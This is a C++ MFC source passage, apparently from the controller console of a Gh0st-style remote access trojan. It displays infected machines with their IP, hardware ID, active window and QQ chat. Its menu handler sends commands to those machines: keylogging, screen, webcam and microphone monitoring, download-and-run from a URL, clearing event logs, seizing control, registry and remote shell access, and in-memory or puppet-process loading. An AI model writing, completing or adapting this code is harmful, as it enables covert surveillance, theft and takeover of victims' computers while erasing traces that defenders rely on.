	//	rowIndex, colIndex, colItemIndex, colCaption, itemIndex, itemCaption);


	//	CXTPReportRecord* TemRecord = pItemNotify->pRow->GetRecord();

	//	CXTPReportRecordItem* pItem2 = TemRecord->GetItem(0);
	//	int i=TemRecord->GetIndex();   //获取索引  不被分组影响

	//	CXTPReportRecordItem* pItem = TemRecord->GetItem(1);  //获取项目
	//	pItem->SetCaption("1231212");     //修改项目



		//CXTPReportControl& wndReport = GetReportCtrl();
		//	wndReport->Populate();



	OUT_PUT_FUNCION_NAME_INFO
}

//报表左键双击事件
void CQuickView::OnReportDBLCLK(NMHDR* pNMHDR, LRESULT* pResult) {
	OUT_PUT_FUNCION_NAME_INFO
		XTP_NM_REPORTRECORDITEM* pItemNotify = (XTP_NM_REPORTRECORDITEM*)pNMHDR;
	if (pItemNotify->pRow == nullptr)
	{
		return;
	}
	int rowIndex = pItemNotify->pRow->GetIndex();//行号 
	CXTPReportRow* pRow = wndReport->GetRows()->GetAt(rowIndex);
	if (pRow == nullptr)
	{
		return;
	}
	if (pRow->IsGroupRow())
	{
		return;
	}

	int colIndex = pItemNotify->pColumn->GetIndex();//列号 
	CString colCaption = pItemNotify->pColumn->GetCaption();//列标题 


	if (colCaption.Find(_T("屏幕")) != -1) 	HandlingRightClickMessages(MENU_差异屏幕);
	if (colCaption.Find(_T("监控")) != -1)  HandlingRightClickMessages(MENU_加入监控);
	if (colCaption.Find(_T("刷新")) != -1)  HandlingRightClickMessages(MENU_获取状态);
	if (colCaption.Find(_T("截图")) != -1)  HandlingRightClickMessages(MENU_桌面预览);
	if (colCaption.Find(_T("管理")) != -1)  HandlingRightClickMessages(MENU_系统管理);
	if (colCaption.Find(_T("注册")) != -1)  HandlingRightClickMessages(MENU_查注册表);
	if (colCaption.Find(_T("查看")) != -1)  HandlingRightClickMessages(MENU_视频查看);
	if (colCaption.Find(_T("交谈")) != -1)  HandlingRightClickMessages(MENU_远程交谈);
	if (colCaption.Find(_T("修改")) != -1)  HandlingRightClickMessages(MENU_修改备注);
	if (colCaption.Find(_T("文件")) != -1)  HandlingRightClickMessages(MENU_文件管理);
	if (colCaption.Find(_T("终端")) != -1)  HandlingRightClickMessages(MENU_远程终端);
	if (colCaption.Find(_T("代理")) != -1)  HandlingRightClickMessages(MENU_代理映射);
	if (colCaption.Find(_T("方式")) != -1)  HandlingRightClickMessages(MENU_运行方式);


	//{_T("定位"), 65, 1, 1, 300},//1       	
	//{ _T("离开 "),				60	,1,0	,70 },//2			
	//{ _T("窗口 ☝"),				80	,1,1	,200 },//3        
	//{ _T("系统"),				130	,1,0	,160 },//4      
	//{ _T("exe os"),				60	,1,0	,60 },//5  
	//{ _T("视频"),				30	,1,0	,30 },//6 
	//{ _T("聊天"),				55  ,1,1    ,200 },//7        	        
	//{ _T("备注"),				40	,1,1	,100 },//8       
	//{ _T("通信"),		        30  ,1,0    ,30 },//9        
	//{ _T("端口"),				40	,1,0	,40 },//10       
	//{ _T("进程"),				80	,1,0	,120 },//11       
	//{ _T("反馈"),				80	,1,1	,200 },//12    

	//CMessageRecordItemCheck* ItemChecK = (CMessageRecordItemCheck*)pRow->GetRecord()->GetItem(1);
	//ItemChecK->SetCheckedState((ItemChecK->GetCheckedState()) ? FALSE : TRUE);

	//int colIndex = pItemNotify->pColumn->GetIndex();//列号 
	//int colItemIndex = pItemNotify->pColumn->GetItemIndex();//列号 
	//CString colCaption = pItemNotify->pColumn->GetCaption();//列标题 
	//int itemIndex = pItemNotify->pItem->GetIndex();//列号 
	//CString itemCaption = pItemNotify->pItem->GetCaption(pItemNotify->pColumn);//项内容 
	//CString str = "";
	//str.Format(_T("左双击rowIndex=%d,colIndex=%d,colItemIndex=%d,colCaption=%s,itemIndex=%d,itemCaption = % s"),
	//	rowIndex, colIndex, colItemIndex, colCaption, itemIndex, itemCaption);
	//AfxMessageBox(str);


	//CXTPReportRow* pSelRows3 = pRow->GetNextSelectedRow(pSelRows2);


}


//报表头右键事件
void CQuickView::OnReportItemRClick(NMHDR* pNMHDR, LRESULT* pResult) {
	OUT_PUT_FUNCION_NAME_INFO
		XTP_NM_REPORTRECORDITEM* pItemNotify = (XTP_NM_REPORTRECORDITEM*)pNMHDR;

	if (pItemNotify->pRow == nullptr)
	{

		return;
	}
	int rowIndex = pItemNotify->pRow->GetIndex();//行号 
	CXTPReportRow* pRow = wndReport->GetRows()->GetAt(rowIndex);
	if (pRow == nullptr)
	{

		return;
	}
	if (pRow->IsGroupRow())
	{
		CMenu menu;
		VERIFY(menu.CreatePopupMenu());
		menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("关键字过滤器"));
		menu.AppendMenu(MF_SEPARATOR, NULL);
		menu.AppendMenu(MF_STRING | MF_ENABLED, 201, _T("收缩所有类别"));
		menu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("展开一级缩进"));
		menu.AppendMenu(MF_STRING | MF_ENABLED, 301, _T("展开所有缩进"));
#ifndef _XTP_INCLUDE_COMMANDBARS
		int nMenuResult = menu.TrackPopupMenu(TPM_RETURNCMD | TPM_LEFTALIGN | TPM_RIGHTBUTTON, pItemNotify->pt.x, pItemNotify->pt.y, this, NULL);
#else
		int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, pItemNotify->pt.x, pItemNotify->pt.y, this, NULL);
#endif
		if (!nMenuResult)
		{

			return;
		}

		switch (nMenuResult)
		{
		case 100:   //打开过滤器
		{
			CMainFrame* pMainFrm = (CMainFrame*)AfxGetMainWnd();
			if (pMainFrm)
			{
				BOOL bShow = m_wndFilterEditBar->IsVisible() ? FALSE : TRUE;;
				pMainFrm->ShowControlBar(m_wndFilterEditBar, bShow, FALSE);
			}
		}
		break;
		case 201://收缩所有类别
		{
			wndReport->CollapseAll();
		}
		break;
		case 300://展开一级缩进
		{
			wndReport->ExpandAll(FALSE);
		}
		break;
		case 301://展开所有缩进
		{
			wndReport->ExpandAll(TRUE);
			break;
		}
		default:
			break;
		}

		menu.DestroyMenu();

		return;
	}


	//显示菜单

	//更新插件加载菜单

	p_ReportSelectedRows = wndReport->GetSelectedRows();



	i_mListmeau_other_num = mListmeau_other.GetMenuItemCount();

	for (int i = 0; i < i_mListmeau_other_num; i++)
	{
		mListmeau_other.DeleteMenu(i_mListmeau_other_num - i - 1, MF_BYPOSITION);
	}

	int nItemIndex = 60001;

	typedef std::map<CString, CMenu*> PCMenuDate;
	PCMenuDate m_PCMenuDate;

	int counts = g_pCPlugView->m_pPlugList->GetItemCount();
	for (int i = 0; i < counts; i++)
	{
		CString Groupname = g_pCPlugView->m_pPlugList->GetItemText(i, 7);
		PCMenuDate::iterator iter = m_PCMenuDate.find(Groupname);
		if (iter != m_PCMenuDate.end())
		{
			CString itemname = g_pCPlugView->m_pPlugList->GetItemText(i, 3);
			int nLength = itemname.GetLength();
			if (nLength >= 4)	itemname = itemname.Left(nLength - 4);
			iter->second->AppendMenu(MF_STRING | MF_ENABLED, nItemIndex++, itemname);
		}
		else
		{
			CMenu* pmenu = new CMenu;
			pmenu->CreatePopupMenu();
			mListmeau_other.InsertMenu(60, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)pmenu->m_hMenu, Groupname);
			m_PCMenuDate.insert(MAKE_PAIR(PCMenuDate, Groupname, pmenu));
			CString itemname = g_pCPlugView->m_pPlugList->GetItemText(i, 3);
			int nLength = itemname.GetLength();
			if (nLength >= 4)	itemname = itemname.Left(nLength - 4);
			pmenu->AppendMenu(MF_STRING | MF_ENABLED, nItemIndex++, itemname);
		}
	}

	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&mListmeau, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, pItemNotify->pt.x, pItemNotify->pt.y, this, NULL);

	PCMenuDate::iterator iter = m_PCMenuDate.begin();
	while (iter != m_PCMenuDate.end())
	{
		iter->second->DestroyMenu();
		SAFE_DELETE(iter->second);
		m_PCMenuDate.erase(iter++);
	}

	if (!nMenuResult)
	{
		return;
	}

	HandlingRightClickMessages(nMenuResult);


}


void CQuickView::HandlingRightClickMessages(int nMenuResult)
{
	OUT_PUT_FUNCION_NAME_INFO
		switch (nMenuResult)
		{
		case MENU_桌面预览: //发送截图命令
		{	BYTE	bToken = COMMAND_GET_SCREEN; SendSelectCommand(&bToken, sizeof(BYTE)); 	log_信息("获取完整截图"); }	break;
		case MENU_复制全部:						//复制数据
		{
			CString csClipboard;
			CXTPReportSelectedRows* pSelRows = wndReport->GetSelectedRows();
			POSITION pSelRows_POSITION = pSelRows->GetFirstSelectedRowPosition();
			while (pSelRows_POSITION)
			{
				CXTPReportRow* pSelRow_choose = pSelRows->GetNextSelectedRow(pSelRows_POSITION);
				if (pSelRow_choose == nullptr) return;
				if (pSelRow_choose->IsGroupRow()) return;
				CXTPReportRecord* TemRecord = pSelRow_choose->GetRecord();
				for (int i = 1; i < g_Column_Count + 1; i++)
				{
					CXTPReportRecordItem* pItem = TemRecord->GetItem(i);  //获取项目
					csClipboard += pItem->GetCaption();
				}
			}
			Clipboard(csClipboard);
			log_信息("复制全部");
		}
		break;
		case MENU_复制IP:
		{
			CString csClipboard;
			CXTPReportSelectedRows* pSelRows = wndReport->GetSelectedRows();
			POSITION pSelRows_POSITION = pSelRows->GetFirstSelectedRowPosition();
			while (pSelRows_POSITION)
			{
				CXTPReportRow* pSelRow_choose = pSelRows->GetNextSelectedRow(pSelRows_POSITION);
				if (pSelRow_choose == nullptr) return;
				if (pSelRow_choose->IsGroupRow()) return;
				CXTPReportRecord* TemRecord = pSelRow_choose->GetRecord();
				CXTPReportRecordItem* pItem = TemRecord->GetItem(1);  //获取项目
				csClipboard += pItem->GetCaption();
			}
			Clipboard(csClipboard);
			log_信息("复制IP");
		}
		break;
		case MENU_复制聊天:
		{
			CString csClipboard;
			CXTPReportSelectedRows* pSelRows = wndReport->GetSelectedRows();
			POSITION pSelRows_POSITION = pSelRows->GetFirstSelectedRowPosition();
			while (pSelRows_POSITION)
			{
				CXTPReportRow* pSelRow_choose = pSelRows->GetNextSelectedRow(pSelRows_POSITION);
				if (pSelRow_choose == nullptr) return;
				if (pSelRow_choose->IsGroupRow()) return;
				CXTPReportRecord* TemRecord = pSelRow_choose->GetRecord();
				CXTPReportRecordItem* pItem = TemRecord->GetItem(7);  //获取项目
				csClipboard += pItem->GetCaption();
			}
			Clipboard(csClipboard);
			log_信息("复制聊天");
		}
		break;
		case MENU_复制名称:
		{
			CString csClipboard;
			CXTPReportSelectedRows* pSelRows = wndReport->GetSelectedRows();
			POSITION pSelRows_POSITION = pSelRows->GetFirstSelectedRowPosition();
			while (pSelRows_POSITION)
			{
				CXTPReportRow* pSelRow_choose = pSelRows->GetNextSelectedRow(pSelRows_POSITION);
				if (pSelRow_choose == nullptr) return;
				if (pSelRow_choose->IsGroupRow()) return;
				ClientContext* pContext = (ClientContext*)(((pSelRow_choose->GetRecord())->GetItem(0))->GetItemData());
				if (pContext)
					csClipboard += pContext->LoginInfo->CptName;
			}
			Clipboard(csClipboard);
			log_信息("复制名称");
		}
		break;
		case MENU_复制显卡:
		{
			CString csClipboard;
			CXTPReportSelectedRows* pSelRows = wndReport->GetSelectedRows();
			POSITION pSelRows_POSITION = pSelRows->GetFirstSelectedRowPosition();
			while (pSelRows_POSITION)
			{
				CXTPReportRow* pSelRow_choose = pSelRows->GetNextSelectedRow(pSelRows_POSITION);
				if (pSelRow_choose == nullptr) return;
				if (pSelRow_choose->IsGroupRow()) return;
				ClientContext* pContext = (ClientContext*)(((pSelRow_choose->GetRecord())->GetItem(0))->GetItemData());
				if (pContext)
					csClipboard += pContext->LoginInfo->GPU;
			}
			Clipboard(csClipboard);
			log_信息("复制显卡");
		}
		break;
		case MENU_复制编号:
		{
			CString csClipboard;
			CXTPReportSelectedRows* pSelRows = wndReport->GetSelectedRows();
			POSITION pSelRows_POSITION = pSelRows->GetFirstSelectedRowPosition();
			while (pSelRows_POSITION)
			{
				CXTPReportRow* pSelRow_choose = pSelRows->GetNextSelectedRow(pSelRows_POSITION);
				if (pSelRow_choose == nullptr) return;
				if (pSelRow_choose->IsGroupRow()) return;
				ClientContext* pContext = (ClientContext*)(((pSelRow_choose->GetRecord())->GetItem(0))->GetItemData());
				if (pContext)
					csClipboard += pContext->LoginInfo->szHWID;
			}
			Clipboard(csClipboard);
			log_信息("复制编号");
		}
		break;
		case MENU_获取状态: {	BYTE	bToken = COMMAND_GET_PROCESSANDCONDITION; SendSelectCommand(&bToken, sizeof(BYTE)); 	log_信息("刷新进程 状态-窗口 活跃 截图"); }	break;
		case MENU_加入监控: {	BYTE	bToken = COMMAND_MONITOR; SendSelectCommand(&bToken, sizeof(BYTE)); 	log_信息("加入监控"); }	break;
		case MENU_退出监控:
		{
			CXTPReportSelectedRows* pSelRows = wndReport->GetSelectedRows();
			POSITION pSelRows_POSITION = pSelRows->GetFirstSelectedRowPosition();
			while (pSelRows_POSITION)
			{
				CXTPReportRow* pSelRow_choose = pSelRows->GetNextSelectedRow(pSelRows_POSITION);
				if (pSelRow_choose == nullptr) return;
				if (pSelRow_choose->IsGroupRow()) return;
				ClientContext* pContext = (ClientContext*)(((pSelRow_choose->GetRecord())->GetItem(0))->GetItemData());
				if (pContext)
				{
					g_pScreenMonitorDlg->SendMessage(MONITOR_DLG, 0, (LPARAM)pContext);
					if (pContext->Item_cmp_old_IsActive)
						pContext->Item_cmp_old_IsActive->SetBackgroundColor(4294967295);
				}
			}
			log_信息("退出监控");
		}
		break;

		case MENU_下载运行://下载运行
		{CInputDialog	dlg;
		dlg.Init(_T("下载运行"), _T("请输入要下载文件的地址:"), this, TRUE, _T("http://"));
		if (dlg.DoModal() != IDOK)return;
		dlg.m_str.MakeLower();
		if (dlg.m_str.Find(_T("http://")) == -1)
		{
			MessageBox(_T("输入的网址不合法"), _T("错误"));	return;
		}
		int		nPacketLength = dlg.m_str.GetLength() * sizeof(TCHAR) + 3;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_DOWN_EXE;
		memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
		SendSelectCommand(lpPacket, nPacketLength);
		SAFE_DELETE_AR(lpPacket); } break;
		case MENU_上传运行://上传运行
		{	CLocalUpload dlg; dlg.Setview(this);   dlg.DoModal(); }break;
		case MENU_清理日志://清理日志
		{	BYTE	bToken = COMMAND_CLEANLOG; SendSelectCommand(&bToken, sizeof(BYTE)); 	log_信息("清理日志"); }	break;
		case MENU_重新运行://重新运行
		{	BYTE	bToken = COMMAND_RESTART; SendSelectCommand(&bToken, sizeof(BYTE)); 	log_信息("重新运行"); }	break;
		case MENU_卸载://卸载
		{	BYTE	bToken = COMMAND_EXIT; SendSelectCommand(&bToken, sizeof(BYTE)); 	log_信息("卸载"); }	break;
		case MENU_移机://移机
		{	CCopyClientDlg  dlg(_T("移动机器"), nullptr, true);  if (dlg.DoModal() != IDOK) return;  SendSelectCommand((PBYTE)(&dlg.m_COPYCLIENT), sizeof(COPYCLIENT));  log_信息("移动机器"); }break;
		case MENU_复机: //复机
		{	CCopyClientDlg  dlg(_T("复制机器"));  if (dlg.DoModal() != IDOK) return; SendSelectCommand((PBYTE)(&dlg.m_COPYCLIENT), sizeof(COPYCLIENT));  log_信息("复制机器"); }break;
		case MENU_断开测试: //断开测试
		{	BYTE	bToken = COMMAND_CLOSESOCKET; SendSelectCommand(&bToken, sizeof(BYTE));  log_信息("断开测试"); }break;
		case MENU_获取控制权: //获取控制权
		{	BYTE	bToken = COMMAND_SET_DOOR_GETPERMINSSION; SendSelectCommand(&bToken, sizeof(BYTE));  log_信息("获取控制权"); }break;
		case MENU_恢复控制权: //恢复控制权
		{	BYTE	bToken = COMMAND_SET_DOOR_QUITPERMINSSION; SendSelectCommand(&bToken, sizeof(BYTE));  log_信息("恢复控制权"); }break;
		case MENU_注销://注销
		{	BYTE	bToken = COMMAND_LOGOUT; SendSelectCommand(&bToken, sizeof(BYTE)); 	log_信息("注销"); }	break;
		case MENU_重启://重启
		{	BYTE	bToken = COMMAND_REBOOT; SendSelectCommand(&bToken, sizeof(BYTE)); 	log_信息("重启"); }	break;
		case MENU_关机://关机
		{	BYTE	bToken = COMMAND_SHUTDOWN; SendSelectCommand(&bToken, sizeof(BYTE)); 	log_信息("关机"); }	break;
		case MENU_运行方式: //内存加载傀儡加载
		{	BYTE	bToken = COMMAND_CHANGELOAD; SendSelectCommand(&bToken, sizeof(BYTE)); 	log_信息("修改插件运行方式"); }	break;
		case MENU_修改分组:  //修改分组
		{
			p_ReportSelectedRows = wndReport->GetSelectedRows();
			CChangeGroupDlg	dlg;
			if (dlg.DoModal() != IDOK || dlg.strGroup.GetLength() == 0)
				return;
			int		nPacketLength = dlg.strGroup.GetLength() * sizeof(TCHAR) + 4;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_RENAME;
			lpPacket[1] = 0;
			memcpy(lpPacket + 2, dlg.strGroup.GetBuffer(0), nPacketLength - 2);
			if (!p_ReportSelectedRows) return;
			POSITION pSelRows_POSITION;
			do
			{
				pSelRows_POSITION = p_ReportSelectedRows->GetFirstSelectedRowPosition();
				if (!pSelRows_POSITION) return;
				CXTPReportRow* pSelRow_choose = p_ReportSelectedRows->GetNextSelectedRow(pSelRows_POSITION);
				if (pSelRow_choose == nullptr) return;
				if (pSelRow_choose->IsGroupRow()) continue;;
				ClientContext* pContext = (ClientContext*)(((pSelRow_choose->GetRecord())->GetItem(0))->GetItemData());
				if (pContext) 	g_pSocketBase->Send(pContext, lpPacket, nPacketLength);
				memcpy(pContext->LoginInfo->Group, dlg.strGroup.GetBuffer(), dlg.strGroup.GetLength() * 2 + 2);
				g_pTabView->SendMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
				it = m_ClienListDate.find(pContext->LoginInfo->szHWID);
				if (it != m_ClienListDate.end())
				{
					wndReport->RemoveRecordEx(pContext->pRecord_old);
					m_ClienListDate.erase(it);
				}
			} while (pSelRows_POSITION);
			SAFE_DELETE_AR(lpPacket);
			wndReport->RedrawControl();
			log_信息("修改分组");
		}
		break;
		case MENU_修改备注:  //修改备注
		{
			p_ReportSelectedRows = wndReport->GetSelectedRows();
			CInputDialog	dlg;
			dlg.Init(_T("修改备注"), _T("请输入新备注/版本:"), this);
			if (dlg.DoModal() != IDOK || dlg.m_str.GetLength() == 0)
				return;
			int		nPacketLength = dlg.m_str.GetLength() * sizeof(TCHAR) + 4;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_RENAME;
			lpPacket[1] = 1;
			memcpy(lpPacket + 2, dlg.m_str.GetBuffer(0), nPacketLength - 2);
			if (!p_ReportSelectedRows) return;
			POSITION pSelRows_POSITION = p_ReportSelectedRows->GetFirstSelectedRowPosition();
			while (pSelRows_POSITION)
			{
				CXTPReportRow* pSelRow_choose = p_ReportSelectedRows->GetNextSelectedRow(pSelRows_POSITION);
				if (pSelRow_choose == nullptr) return;
				if (pSelRow_choose->IsGroupRow()) continue;
				CXTPReportRecordItem* Item_cmp_change = pSelRow_choose->GetRecord()->GetItem(8);
				Item_cmp_change->SetCaption(dlg.m_str);
				ClientContext* pContext = (ClientContext*)(((pSelRow_choose->GetRecord())->GetItem(0))->GetItemData());
				memcpy(pContext->LoginInfo->Remark, dlg.m_str.GetBuffer(0), (dlg.m_str.GetLength() > 49) ? 98 : dlg.m_str.GetLength() * sizeof(TCHAR) + 2);
				if (pContext) 	g_pSocketBase->Send(pContext, lpPacket, nPacketLength);
			}
			SAFE_DELETE_AR(lpPacket);
			wndReport->RedrawControl();
			log_信息("修改备注");
		}
		break;
		case MENU_取消帅选:
		{
			p_ReportSelectedRows = wndReport->GetSelectedRows();
			if (!p_ReportSelectedRows) return;
			POSITION pSelRows_POSITION = p_ReportSelectedRows->GetFirstSelectedRowPosition();
			while (pSelRows_POSITION)
			{
				CXTPReportRow* pSelRow_choose = p_ReportSelectedRows->GetNextSelectedRow(pSelRows_POSITION);
				if (pSelRow_choose == nullptr) return;
				if (pSelRow_choose->IsGroupRow()) continue;
				ClientContext* pContext = (ClientContext*)(((pSelRow_choose->GetRecord())->GetItem(0))->GetItemData());
				if (pContext) pContext->Item_cmp_old_winodow->SetBackgroundColor(4294967295);
			}
			wndReport->RedrawControl();
			log_信息("修改备注");
		}
		break;
		case MENU_帅选进程:
		{				p_ReportSelectedRows = wndReport->GetSelectedRows();
		CInputDialog	dlg;
		dlg.Init(_T("进程筛选"), _T("请输入关键字:"), this);
		if (dlg.DoModal() != IDOK || dlg.m_str.GetLength() == 0)
			return;
		int		nPacketLength = dlg.m_str.GetLength() * sizeof(TCHAR) + 3;
		LPBYTE	lpPacket = new BYTE[nPacketLength];
		lpPacket[0] = COMMAND_FILTERPROCESS;
		memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
		if (!p_ReportSelectedRows) return;
		POSITION pSelRows_POSITION = p_ReportSelectedRows->GetFirstSelectedRowPosition();
		while (pSelRows_POSITION)
		{
			CXTPReportRow* pSelRow_choose = p_ReportSelectedRows->GetNextSelectedRow(pSelRows_POSITION);
			if (pSelRow_choose == nullptr) return;
			if (pSelRow_choose->IsGroupRow()) continue;
			ClientContext* pContext = (ClientContext*)(((pSelRow_choose->GetRecord())->GetItem(0))->GetItemData());
			if (pContext) 	g_pSocketBase->Send(pContext, lpPacket, nPacketLength);
		}
		SAFE_DELETE_AR(lpPacket);
		log_信息("进程筛选");
		}
		break;
		case MENU_压力测试:
		case MENU_文件管理:
		case MENU_差异屏幕:
		case MENU_高速屏幕:
		case MENU_娱乐屏幕:
		case MENU_后台屏幕:
		case MENU_播放监听:
		case MENU_语音监听:
		case MENU_视频查看:
		case MENU_系统管理:
		case MENU_远程终端:
		case MENU_键盘记录:
		case MENU_查注册表:
		case MENU_代理映射:
		case MENU_远程交谈:
		case MENU_驱动插件:
		{
			CString menuStr;
			mListmeau.GetMenuString(nMenuResult, menuStr, MF_BYCOMMAND);
			int nfind = menuStr.ReverseFind('(');
			if (nfind > 0)
			{
				menuStr = menuStr.Mid(0, nfind);
			}
			SendDll(menuStr.GetBuffer());
			log_信息(menuStr);
		}
		break;
		default:
			break;
		}
	if (nMenuResult > 60000 && nMenuResult < 65535)
	{
		CString menuStr;
		mListmeau.GetMenuString(nMenuResult, menuStr, MF_BYCOMMAND);
		SendDll(menuStr.GetBuffer(), TASK_PLUG);
		log_信息(menuStr);
	}

}





//报表组事件
void CQuickView::OnReportGroupOrderChanged(NMHDR* pNotifyStruct, LRESULT* /*result*/)
{
	XTP_NM_REPORTCOLUMNORDERCHANGED* pItemNotify = (XTP_NM_REPORTCOLUMNORDERCHANGED*)pNotifyStruct;
	ASSERT(pItemNotify != NULL);
	CXTPReportGroupRow* pGroupRow_old = NULL;
	CString str;
	int icount = wndReport->GetRows()->GetCount();
	CXTPReportRow* pRow_first = wndReport->GetRows()->GetAt(0);
	if (!pRow_first) return;
	if (pRow_first->IsGroupRow())
	{
		for (int i = 0; i < icount; i++)
		{
			CXTPReportRow* pRow = wndReport->GetRows()->GetAt(i);
			if (pRow == nullptr)
				return;
			if (pRow->IsGroupRow())
			{
				int num = 0;
				int i_level = pRow->GetGroupLevel();
				CXTPReportGroupRow* pGroupRow_old = reinterpret_cast<CXTPReportGroupRow*>(pRow);
				str = pGroupRow_old->GetCaption();
				for (int j = i + 1; j < icount; j++)
				{
					CXTPReportRow* pRow_tem = wndReport->GetRows()->GetAt(j);
					if (pRow_tem == nullptr)
						return;
					if (pRow_tem->IsGroupRow())
					{
						if (i_level == pRow_tem->GetGroupLevel())
							break;
						else
							continue;
					}
					else
					{
						num++;
					}
				}
				CString temstr; temstr.Format(_T("     数量:  %d"), num);
				str += temstr;
				pGroupRow_old->SetCaption(str);
				continue;
			}
		}
	}
	else
	{
		return;  //第一行不是组标题直接退出
	}

}



CXTPReportRecordItem* CQuickView::MainAddItem(CXTPReportRecord* pRecord, LPCTSTR szText, int ico_num)
{
	CXTPReportRecordItemText* pItem = new CXTPReportRecordItemText(szText);
	if (ico_num != -1) 	pItem->SetIconIndex(ico_num);  //设置图标
	pItem->SetAlignment(DT_CENTER);
	pRecord->AddItem(pItem);
	return pItem;
}

CXTPReportRecordItem* CQuickView::MainChangeItem(CXTPReportRecord* pRecord, LPCTSTR szText, int ico_num, int index)
{
	CXTPReportRecordItem* pItem = pRecord->GetItem(index);
	if (ico_num != -1) 	pItem->SetIconIndex(ico_num);  //设置图标
	pItem->SetCaption(szText);
	return pItem;
}


//普通客户端上线处理
afx_msg LRESULT CQuickView::OnAddtomainlist(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
	CCriSecLock recvlock(m_clcs);
	ClientContext* pContext = (ClientContext*)lParam;
	if ((pContext == NULL))
		return -1;

	try
	{
		if (!pContext->LoginInfo)
			return -1;

		memcpy(LoginInfo, pContext->LoginInfo, sizeof(LOGININFO));
		
		it = m_ClienListDate.find(LoginInfo->szHWID);
		if (it != m_ClienListDate.end())
		{
			TRACE("重复上线 %d %d \n", pContext, LoginInfo);
			////////////////////////////////////////重复上线问题//////////////////////////////////////////////// 

			CXTPReportRecord* pRecord = it->second;
			pContext->pRecord_old = pRecord;
			pContext->Item_cmp_old_Context = pRecord->GetItem(0);
			ClientContext* pContext_old = (ClientContext*)(pContext->Item_cmp_old_Context->GetItemData());
			if ((pContext_old == NULL))
			{
				log_信息("OnAddtomainlist出问题 ---重新上线(ClientContext*)(pContext->Item_cmp_old_Context->GetItemData())==NULL");
				m_ClienListDate.erase(it);
				return -1;
			}
			if (pContext == pContext_old)
			{
				return -1;
			}
			//如果是在屏幕监控就去替换下
			if (pContext_old->m_Dialog[1] == MONITOR_DLG)
			{
				g_pScreenMonitorDlg->SendMessage(WM_MONITOR_CHANGECLIENT, 0, (LPARAM)pContext);
			}
			pContext_old->m_bIsMainSocket = FALSE; //取消列表权限
			if (pContext_old->LoginInfo) SAFE_DELETE(pContext_old->LoginInfo);
			pContext_old->pView = NULL;
			if (pContext_old->PictureSize != 0)
			{
				pContext_old->PictureSize = 0;
				SAFE_DELETE_AR(pContext_old->ScreenPicture);
			}

			CString	str;
			pContext->m_bIsMainSocket = TRUE;
			pContext->Item_cmp_old_Context->SetItemData((DWORD_PTR)pContext);						//绑定数据
			pContext->pView = this;
			str = pContext->szAddress;
			memcpy(LoginInfo->ip, str.GetBuffer(), str.GetLength() * 2 + 2);
			if (g_pFrame->m_gQQwry)
			{
				CString addr = g_pFrame->m_gQQwry->IPtoAdd(pContext->szAddress);
				memcpy(LoginInfo->addr, addr.GetBuffer(), (min(addr.GetLength(), 19) * 2) + 2);
				str += LoginInfo->addr;
			}
			else
				str += _T("无IP数据库");
			str += _T(" \nLAN:");
			str += LoginInfo->N_ip;
			MainChangeItem(pRecord, str, -1, 1);					//添加项-> 国旗	 位置-延迟-ip												

			pContext->Item_cmp_old_IsActive = MainChangeItem(pRecord, LoginInfo->UserActive, -1, 2);				//添加项-> 状态   操作 //	

			pContext->Item_cmp_old_winodow = MainChangeItem(pRecord, LoginInfo->Window, -1, 3);					//添加项-> 活动窗口

			MainChangeItem(pRecord, LoginInfo->OsName, -1, 4);				//添加项-> 系统

			MainChangeItem(pRecord, LoginInfo->ExeAndOs, -1, 5);				//添加项-> 客户端位数 系统位数

			CXTPReportRecordItem* WebCamItem = MainChangeItem(pRecord, LoginInfo->IsWebCam, -1, 6);				//添加项-> 视频

			LoginInfo->backdoor ? WebCamItem->SetBackgroundColor(RGB(7, 254, 254)) : WebCamItem->SetBackgroundColor(4294967295);

			MainChangeItem(pRecord, LoginInfo->Chat, -1, 7);					//添加项-> 在线QQ

			MainChangeItem(pRecord, LoginInfo->Remark, -1, 8);					//添加项->备注    

			MainChangeItem(pRecord, (pContext->switchsocket == tcp) ? _T("TCP") : _T("UDP"), -1, 9); //添加项-> 方式

			str.Format(_T("%d"), pContext->m_port);
			MainChangeItem(pRecord, str.GetBuffer(), -1, 10);						//添加项-> 端口

			MainChangeItem(pRecord, LoginInfo->Process, -1, 11);									//添加项->自身进程ID 进程等级 当前用户 

			pContext->Item_cmp_old_m_Time = MainChangeItem(pRecord, LoginInfo->m_Time, -1, 12);		//添加项-> 上线时间

			g_pLogView->InsertLogItem(_T("替换"), LoginInfo->ip, LoginInfo->addr, LoginInfo->CptName, LoginInfo->OSVersion, LoginInfo->Group, LoginInfo->Remark, LoginInfo->Virus);
			////////////////////////////////////////重新上线提示音//////////////////////////////////////////////// 

			wndReport->RedrawControl();

			// 激活
			BYTE	bToken = TOKEN_ACTIVED;
			g_pSocketBase->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
			TRACE("数量 %d \n", m_ClienListDate.size());

		}
		else
		{
			//////////////////////////////////////////////新增加用户//////////////////////////////
			TRACE("新增加用户 %d %d \n", pContext, LoginInfo);
			CXTPReportRecord* pRecord = new CXTPReportRecord();
			if (pRecord == NULL)
			{
				return 0;
			}
			((CQuickApp*)AfxGetApp())->ChangeOSnum(LoginInfo->OSVersion, true);
			pContext->Item_cmp_old_Context = pRecord->AddItem(new CXTPReportRecordItemNumber());							//增加序号项目
			pContext->pRecord_old = pRecord;
			pContext->Item_cmp_old_Context->SetItemData((DWORD_PTR)pContext);										//绑定数据
			pContext->pView = this;
			pContext->m_bIsMainSocket = TRUE;
			m_ClienListDate.insert(MAKE_PAIR(ClienListDate, LoginInfo->szHWID, pRecord));
			CString	str;
			str = pContext->szAddress;
			memcpy(LoginInfo->ip, str.GetBuffer(), str.GetLength() * 2 + 2);
			if (g_pFrame->m_gQQwry)
			{
